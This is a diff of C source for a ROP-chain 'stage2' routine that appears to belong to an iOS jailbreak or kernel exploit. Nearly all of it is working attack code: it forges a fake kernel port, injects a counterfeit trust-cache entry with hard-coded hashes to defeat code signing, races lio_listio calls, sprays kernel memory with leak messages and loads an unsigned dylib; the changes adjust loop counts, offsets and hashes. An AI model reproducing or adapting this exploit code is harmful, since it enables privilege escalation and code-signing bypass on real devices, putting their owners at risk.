@@ -663,9 +663,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	// map the memory it uses
 	CALL("__mmap",offsets->errno_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);
 
-
-	// fixup mach_msg
 	CALL("__mmap",offsets->mach_msg_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);
+
 #if 0
 
 	char * dylib_str = malloc(100);
@@ -733,7 +732,6 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	*/
 
-#if 0
 	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),&buf);
 	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);
 	/*
@@ -856,20 +854,18 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ROP_VAR_ARG("cmp_str",1);
 	ROP_VAR_ARG_W_OFFSET("get_property_msg",2,offsetof(struct get_property_reply,data));
 	CALL_FUNC_RET_SAVE_VAR("strcmp_retval",get_addr_from_name(offsets,"strcmp"),0,0,0,0,0,0,0,0);
-#endif
 
 	ADD_LOOP_START("test_loop")
 		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG("dylib_str",2);
-		CALL("write",2,0,1024,0,0,0,0,0);
+		CALL("write",1,0,1024,0,0,0,0,0);
 
 
-	/*	
+		
 		// set x0 to the_one
 		SET_X0_FROM_ROP_VAR("strcmp_retval");
 		// break out of the loop if x0 is nonzero
 		ADD_LOOP_BREAK_IF_X0_NONZERO("test_loop");
-		*/
 	ADD_LOOP_END();
 #else
 
@@ -899,7 +895,6 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 
 	kport_t * fakeport = malloc(sizeof(kport_t));
-	memset(fakeport,0,sizeof(kport_t));
 	fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE;
 	fakeport->ip_references = 100;
 	fakeport->ip_lock.type = 0x11;
@@ -960,7 +955,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
 	new_entry->count = 2;
-    hash_t my_dylib_hash = {0xa8,0xe2,0x66,0x77,0xa5,0x45,0xda,0xcf,0x40,0x49,0x1e,0x34,0x4f,0x96,0x2b,0xa7,0xec,0xdf,0xf6,0x1c};
+	hash_t my_dylib_hash = {0x1b,0x38,0xec,0x20,0x35,0xad,0x90,0xad,0x17,0x35,0xcb,0xbc,0xb0,0x88,0xa2,0xba,0x6a,0x10,0xbd,0x84};
 	hash_t my_binary_hash = {0xa8,0x90,0xd0,0x59,0xd7,0xc3,0xed,0x51,0x26,0x37,0xa1,0xf2,0xa2,0x42,0xf8,0x59,0x58,0xbe,0x60,0xd2};
 	memcpy(&new_entry->hash[0],my_dylib_hash,20);
 	memcpy(&new_entry->hash[1],my_binary_hash,20);
@@ -1232,23 +1227,23 @@ _STRUCT_ARM_THREAD_STATE64
 
 	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16
 
-	SET_ROP_VAR64("msg_port",MACH_PORT_NULL); 
-
-	// mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, msg_port);
-	ROP_VAR_ARG_HOW_MANY(2);
-	ROP_VAR_ARG64("self",1);
-	ROP_VAR_ARG("msg_port",3);
-	CALL("mach_port_allocate", 0, MACH_PORT_RIGHT_RECEIVE, 0,0,0,0,0,0);
-
-	ROP_VAR_ARG_HOW_MANY(3);
-	ROP_VAR_ARG64("self",1);
-	ROP_VAR_ARG64("msg_port",2);
-	ROP_VAR_ARG64("msg_port",3);
-	CALL("mach_port_insert_right",0,0,0, MACH_MSG_TYPE_MAKE_SEND,0,0,0,0);
-
-	// TODO: optimize this loop (the memleak_msg can leak 10 objs at once instead of calling the syscall 10 times)
+	// TODO: optimize this loop (we don't have to create a port on each try and the memleak_msg can leak 10 objs at once instead of calling the syscall 10 times)
 	ADD_LOOP_START("main_loop");
 	
+		SET_ROP_VAR64("msg_port",MACH_PORT_NULL); 
+
+		// mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, msg_port);
+		ROP_VAR_ARG_HOW_MANY(2);
+		ROP_VAR_ARG64("self",1);
+		ROP_VAR_ARG("msg_port",3);
+		CALL("mach_port_allocate", 0, MACH_PORT_RIGHT_RECEIVE, 0,0,0,0,0,0);
+	
+		ROP_VAR_ARG_HOW_MANY(3);
+		ROP_VAR_ARG64("self",1);
+		ROP_VAR_ARG64("msg_port",2);
+		ROP_VAR_ARG64("msg_port",3);
+		CALL("mach_port_insert_right",0,0,0, MACH_MSG_TYPE_MAKE_SEND,0,0,0,0);
+
 		ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,head.msgh_remote_port),"msg_port",0,sizeof(mach_port_t));
 		SET_ROP_VAR32("tmp_port",0); // make sure tmp_port really is zero
 
@@ -1259,7 +1254,7 @@ _STRUCT_ARM_THREAD_STATE64
 		// no need for another loop in rop... we can just unroll this one here
 		
 		ROP_VAR_CPY_W_OFFSET("memleak_msg",offsetof(MEMLEAK_Request,Head.msgh_remote_port),"client",0,sizeof(mach_port_t)); // set memleak_msg->Head.msgh_request_port
-		for (int i = 0; i < 15; i++) {
+		for (int i = 0; i < 10; i++) {
 			ROP_VAR_ARG_HOW_MANY(1);
 			ROP_VAR_ARG("memleak_msg",1);
 			CALL("mach_msg",0,MACH_SEND_MSG | MACH_MSG_OPTION_NONE, sizeof(MEMLEAK_msg),0,0,0,0,0);
@@ -1296,14 +1291,9 @@ _STRUCT_ARM_THREAD_STATE64
 
 	SET_ROP_VAR64("should_race",1); // stop the other thread
 
-
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("WEDIDIT",2);
 	CALL("write",2,0,1024,0,0,0,0,0);
-
-	ADD_LOOP_START("phew");
-		ADD_USLEEP(100);
-	ADD_LOOP_END();
 
 	ROP_VAR_ARG_HOW_MANY(3);
 	ROP_VAR_ARG64("self",1);
@@ -1520,7 +1510,6 @@ _STRUCT_ARM_THREAD_STATE64
     CALL("mach_port_deallocate",0,0,0,0,0,0,0,0);
 	*/
 
-
 	// ghetto dlopen
 	// get a file descriptor for that dylib
 	DEFINE_ROP_VAR("dylib_fd",8,&buf);
@@ -1644,7 +1633,7 @@ _STRUCT_ARM_THREAD_STATE64
 	lib_offsets->struct_offsets.ipr_size = 0x8;
 	lib_offsets->struct_offsets.sizeof_task = 0x5c8;
 	lib_offsets->struct_offsets.task_all_image_info_addr = 0x3a8;
-	lib_offsets->struct_offsets.task_all_image_info_addr = 0x3b0;
+	lib_offsets->struct_offsets.task_all_image_info_size = 0x3b0;
 	// iosurface stuff isn't set and also isn't used
 	lib_offsets->userland_funcs.write = get_addr_from_name(offsets,"write") - 0x180000000 + offsets->new_cache_addr;
 	lib_offsets->userland_funcs.IOConnectTrap6 = get_addr_from_name(offsets,"IOConnectTrap6") - 0x180000000 + offsets->new_cache_addr;
@@ -1735,7 +1724,7 @@ _STRUCT_ARM_THREAD_STATE64
 	}
 
 	ADD_LOOP_START("racer_loop");
-		for (int i = 0; i<64;i++) {
+		for (int i = 0; i<1;i++) {
 			ROP_VAR_ARG_HOW_MANY(1);
 			ROP_VAR_ARG("aio_list",2);
 			CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
